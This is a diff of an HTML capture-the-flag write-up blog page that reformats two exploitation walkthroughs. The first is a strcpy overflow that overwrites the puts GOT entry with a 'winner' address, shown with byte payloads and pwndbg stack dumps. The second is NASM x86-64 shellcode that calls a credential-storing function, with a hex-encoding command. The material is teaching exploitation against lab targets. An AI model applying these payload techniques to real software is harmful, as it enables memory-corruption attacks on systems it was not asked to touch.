+atrhax/winning_attitude % xxd input
 00000000: 9090 9090 9090 9090 9090 9090 9090 9090  ................
 00000010: 9090 9090
-</pre></div>
-This payload may be written in Pythonic style as "\x90"*20.
-	</p>
-	<p>
-The first strcpy call is located at 0x08049591 <main+286>.
 
+</code></pre>
+
+<p>
+This payload may be written in Pythonic style as "\x90"*20.
+</p>
+
+<p>
+	
+</p>
+
+<p>
+	
+</p>
+
+<p>
+The first strcpy call is located at 0x08049591 <main+286>.
+</p>
+
+<p>
 Prior to execution of the strcpy function for the first time, the stack is arranged like so:
-<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><table><tr><td><pre style="margin: 0; line-height: 125%">1
-2
-3
-4
-5
-6
-7
-8</pre></td><td><pre style="margin: 0; line-height: 125%">pwndbg&gt; stack
+</p>
+
+<pre id="gdb"><code>
+pwndbg&gt; stack
 00:0000│ esp  0xffffccd0 —▸ 0x804d1b0 ◂— 0x0
 01:0004│      0xffffccd4 —▸ 0xffffcce8 ◂— 0x90909090
 02:0008│      0xffffccd8 ◂— 0x400
@@ -556,45 +703,80 @@ Prior to execution of the strcpy function for the first time, the stack is arran
 04:0010│      0xffffcce0 —▸ 0xffffcd08 ◂— 0x0
 05:0014│      0xffffcce4 ◂— 0x33bfcd2
 06:0018│ edx  0xffffcce8 ◂— 0x90909090
-</pre></td></tr></table></div>
+
+</code></pre>
+
+<p>
 Here, the top of the stack (esp) is the destination argument for strcpy.
-	</p>
+</p>
 
+<p>
+	
+</p>
+
+<p>
 Now, while still at the first strcpy, we examine the destination buffer's contents before and after the call.
+</p>
 
+<p>
 Before:
-<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">pwndbg&gt; x/8x 0x804d1b0
+</p>
+
+<pre id="gdb"><code>
+pwndbg&gt; x/8x 0x804d1b0
 0x804d1b0:      0x00000000      0x00000000      0x00000000      0x00000011
 0x804d1c0:      0x00000002      0x0804d1d0      0x00000000      0x00000011
-</pre></div>
 
+</code></pre>
+
+<p>
 After:
-<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">pwndbg&gt; x/8x 0x804d1b0
+</p>
+
+<pre id="gdb"><code>
+pwndbg&gt; x/8x 0x804d1b0
 0x804d1b0:      0x90909090      0x90909090      0x90909090      0x90909090
 0x804d1c0:      0x90909090      0x0804d100      0x00000000      0x00000011
-</pre></div>
 
-We can see that the first strcpy call added a trailing zero, overwriting the last byte of the address located at 0x804d1c4.<br>
+</code></pre>
+
+<p>
+We can see that the first strcpy call added a trailing zero, overwriting the last byte of the address located at 0x804d1c4.
+</p>
+
+<p>
 Breaking the second strcpy at0x080495ac, I was able to verify the address at 0x0804d1c4 had come to makes it way to 0xffffccd0 acting as a strcpy argument.
 </p>
+
 <p>
-To prove this, consider the payload "\x90"*20 + "\xef\xbe\xad\xde" + "\x00". The trailing null tells strcpy to stop copying, this way we don't trash the GOT (or whatever), turning library calls into segfaults.<br>
+To prove this, consider the payload "\x90"*20 + "\xef\xbe\xad\xde" + "\x00". The trailing null tells strcpy to stop copying, this way we don't trash the GOT (or whatever), turning library calls into segfaults.
+</p>
+
+<p>
 Breaking on the second strcpy again and examining the stack we see
-<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">00:0000│ esp  0xffffcd20 ◂— 0xdeadbeef
+</p>
+
+<pre id="gdb"><code>
+00:0000│ esp  0xffffcd20 ◂— 0xdeadbeef
 01:0004│      0xffffcd24 —▸ 0xffffcd38 ◂— 0x0
 02:0008│      0xffffcd28 ◂— 0x400
 03:000c│      0xffffcd2c ◂— 0x0
 04:0010│      0xffffcd30 —▸ 0xffffcd58 ◂— 0x0
 05:0014│      0xffffcd34 ◂— 0x33bfcd2
 06:0018│ edx  0xffffcd38 ◂— 0x0
-</pre></div>
-</p>
+
+</code></pre>
+
 <p>
 Now we can use whatever the second read receives to write into that address. In this case, we want to write to the address in the GOT corresponding to the "puts" function with the address of the "winner" function. The first thought I had was to try the payload "\x90" + puts + "\x00" + winner +"\x00", where puts is "\x30\xc0\x04\x08" and winner is "\x27\x94\x04\x08". The problem with this payload is that the read function reads 1024 bytes each time regardless of null bytes. The following payload accounts for that issue: "\x90"*20 + puts + "\x00"*1000 + winner + "\x00".
 </p>
 
+<p>
 Let's examine the action of the winning payload. Pausing at the second strcpy and examining the stack one more, we see
-<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">pwndbg> stack
+</p>
+
+<pre id="gdb"><code>
+pwndbg> stack
 00:0000│ esp  0xffffcd20 —▸ 0x804c030 (puts@got.plt) —▸ 0x80490d0 ◂— endbr32 
 01:0004│      0xffffcd24 —▸ 0xffffcd38 —▸ 0x8049427 (winner) ◂— endbr32 
 02:0008│      0xffffcd28 ◂— 0x400
@@ -603,50 +785,108 @@ Let's examine the action of the winning payload. Pausing at the second strcpy an
 05:0014│      0xffffcd34 ◂— 0x33bfcd2
 06:0018│ edx  0xffffcd38 —▸ 0x8049427 (winner) ◂— endbr32 
 07:001c│      0xffffcd3c ◂— 0x0
-</pre></div>
+
+</code></pre>
+
+<p>
 Examining the value of puts entry in the GOT, we can see that it has been succesfully overwritten with the address of winner.
-<div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">pwndbg> x 0x804c030
+</p>
+
+<pre id="gdb"><code>
+pwndbg> x 0x804c030
 0x804c030 <puts@got.plt>:       0x08049427
-	</pre></div>
-	<h3>Exploitation #2: Shellcode Hollaback</h3>
+
+</code></pre>
+
+<h3>Exploitation #2: Shellcode Hollaback</h3>
+
+<p>
 	<blockquote>
-	<p>
+</p>
+
+<p>
+	
+</p>
+
+<p>
 		After days of reversing a certain x86-64 target running Linux, you're finally able to execute up to 64 bytes of shellcode. You also know the location of a function (0x5555555551b5) that will store a username and password. You can then use these credentials to retrieve the flag. Thankfully, symbols were left in so you know that the function's signature is:
+</p>
 
+<p>
 void store_credentials(const char* username, const char* password)
+</p>
 
+<p>
 Using this information, construct some shellcode that will help you retrieve the flag. Best of luck!
-	</p>
+</p>
 
+<p>
+	
+</p>
+
+<p>
   <footer>Challenge description</footer>
+</p>
+
+<p>
 </blockquote>
+</p>
 
-	<p>
-	This boils down to correctly calling a function. We know its an x86-64 Linux machine, so the <a href="https://wiki.osdev.org/System_V_ABI#x86-64">SYSV64 ABI</a> must be observed. This means, in particular, that function arguments are passed in the rdi, rsi, rdx, rcx, r8, r9 registers (additional values are passed on the stack in reverse order).</p>
-	<p>
+<p>
+	
+</p>
+
+<p>
+	This boils down to correctly calling a function. We know its an x86-64 Linux machine, so the <a href="https://wiki.osdev.org/System_V_ABI#x86-64">SYSV64 ABI</a> must be observed. This means, in particular, that function arguments are passed in the rdi, rsi, rdx, rcx, r8, r9 registers (additional values are passed on the stack in reverse order).
+</p>
+
+<p>
+	
+</p>
+
+<p>
 	One thing to keep in mind is that the username and password strings have to be stored in memory somewhere. This can be easily achieved by pushing the bytes corresponding to the string onto the stack and using the stack pointer register as a pointer to the string. I chose to make the username and password the same ("root") as a further simplification.
-	</p>
+</p>
+
+<p>
+	
+</p>
+
+<p>
 The shellcode is shown below in NASM syntax:
-<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><table><tr><td><pre style="margin: 0; line-height: 125%">1
-2
-3
-4
-5
-6
-7</pre></td><td><pre style="margin: 0; line-height: 125%"><span style="color: #008800; font-weight: bold">bits</span> <span style="color: #0000DD; font-weight: bold">64</span>
-<span style="color: #0066BB; font-weight: bold">mov</span> <span style="color: #007020">rax</span>, <span style="background-color: #fff0f0">&#39;root&#39;</span>
-<span style="color: #0066BB; font-weight: bold">push</span> <span style="color: #007020">rax</span>
-<span style="color: #0066BB; font-weight: bold">mov</span> <span style="color: #007020">rsi</span>, <span style="color: #007020">rsp</span>
-<span style="color: #0066BB; font-weight: bold">mov</span> <span style="color: #007020">rdi</span>, <span style="color: #007020">rsp</span>
-<span style="color: #0066BB; font-weight: bold">mov</span> <span style="color: #007020">rbx</span>, <span style="color: #005588; font-weight: bold">5555555551b5h</span>
-<span style="color: #0066BB; font-weight: bold">call</span> <span style="color: #007020">rbx</span>
-</pre></td></tr></table></div>
+</p>
 
-	</p>
-	The shellcode ('shell.s') was to be submitted as a hex string, so I compiled it and formatted it with the command
-	<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><table><tr><td><pre style="margin: 0; line-height: 125%">1</pre></td><td><pre style="margin: 0; line-height: 125%">nasm shell.s <span style="color: #333333">&amp;&amp;</span> sed -r <span style="background-color: #fff0f0">&#39;s/(.{2})/\\x\1/g;s/,$//&#39;</span> <span style="color: #333333">&lt;&lt;&lt;</span> <span style="background-color: #fff0f0">`</span>hexdump -e <span style="background-color: #fff0f0">&#39;16/1 &quot;%02.2x&quot;&#39;</span> shell<span style="background-color: #fff0f0">`</span>
-</pre></td></tr></table></div>
+<pre id="nasm"><code>
+bits 64
+mov rax, 'root'
+push rax
+mov rsi, rsp
+mov rdi, rsp
+mov rbx, 5555555551b5h
+call rbx
 
-	</div>
+</code></pre>
+
+<p>
+The shellcode ('shell.s') was to be submitted as a hex string, so I compiled it and formatted it with the command
+</p>
+
+<pre id="bash"><code>
+nasm shell.s &amp;&amp; sed -r #39;s/(.{2})/\\x\1/g;s/,$//&#39; &lt;&lt;&lt; `hexdump -e &#39;16/1 &quot;%02.2x&quot;&#39; shell`
+
+</code></pre>
+
+               </div>
+               
+            </div>
+        </article>
+    </main>
+    <footer id="page-footer">
+        <div class="footer-copyright">©&nbsp;2017-2021&nbsp;<i><a href="mailto:euler90h@gmail.com">eu90h</a></i></div>
+        <nav>
+            <a href="index.html">HOME</a>
+            <a href="about">ABOUT</a>
+        </nav>
+    </footer>
 </body>
 </html>
